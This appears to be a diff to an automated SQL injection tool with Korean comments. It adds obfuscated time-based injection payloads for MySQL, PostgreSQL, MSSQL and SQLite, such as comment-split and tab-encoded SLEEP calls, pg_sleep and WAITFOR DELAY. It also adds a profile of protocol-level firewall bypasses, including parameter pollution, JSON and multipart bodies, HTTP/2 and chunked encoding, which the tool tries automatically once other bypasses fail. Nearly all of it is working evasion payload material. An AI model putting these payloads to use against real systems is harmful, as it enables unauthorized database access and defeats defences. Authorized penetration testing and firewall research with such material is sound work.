@@ -127,10 +127,20 @@ FUNCTION_ALTERNATIVES: dict[str, list[str]] = {
 
     # ── SLEEP/시간 기반 ─────────────────────────────────────────
     "SLEEP": [
-        "SLEEP/***/({n})",
-        "BENCHMARK(5000000,MD5(1))",
-        "GET_LOCK('a',{n})",
+        "SLEEP/***/({n})",           # 공백 주석
+        "SLEEP/***/({n},1)",         # MySQL 2-arg
+        "/*!SLEEP*/({n})",           # 버전 인라인 주석
+        "SLEEP%09({n})",             # 탭 공백
+        "BENCHMARK(50000000,MD5(1))",
+        "GET_LOCK(0x61,{n})",        # GET_LOCK('a', n)
         "WAIT_FOR_EXECUTED_GTID_SET('a',{n})",
+        # PostgreSQL 대체
+        "pg_sleep({n})",
+        "(SELECT pg_sleep({n}))",
+        # MSSQL 대체
+        "WAITFOR DELAY '0:0:{n}'",
+        # SQLite 대체
+        "(SELECT count(*) FROM sqlite_master t1,sqlite_master t2,sqlite_master t3)",
     ],
 
     # ── SELECT 키워드 ───────────────────────────────────────────
@@ -413,6 +423,21 @@ GLOBAL_WAF_PROFILES: dict[str, dict] = {
         ],
         "tampers": ["space2tab", "versionedmorekeywords", "randomcase", "nullbyte"],
         "notes": "공공기관 표준 WAF — 400 응답으로 SQL 키워드 차단. 헤더 인젝션이 가장 효과적",
+    },
+
+    # ── HPP / JSON / Multipart / HTTP2 / Chunked 프로토콜 우회 ──
+    "protocol_bypass": {
+        "vendor": "Protocol-Level WAF Bypass (범용)",
+        "detection": [],  # 명시적 감지 없음 — Boolean/헤더 모두 실패 시 자동 시도
+        "bypass_strategy": [
+            "HPP (HTTP Parameter Pollution): ?id=1&id=payload — 일부 WAF는 첫 번째 값만 검사",
+            "JSON body POST: Content-Type: application/json + {\"id\":\"payload\"} — WAF JSON 파서 미구현 시",
+            "Multipart/form-data: -F 'id=payload' — form boundary로 시그니처 분산",
+            "HTTP/2: --http2 — WAF가 HTTP/1.1만 분석하는 경우",
+            "Chunked Transfer-Encoding: Transfer-Encoding: chunked — 페이로드 분할로 시그니처 분산",
+        ],
+        "tampers": [],
+        "notes": "Boolean 우회 12종 + 헤더 인젝션 5종 모두 실패 후 자동 시도 (sqli_boolean STAGE 4)",
     },
 
     # ── Generic 400-block WAF (AND/OR→400 패턴) ──────────────────
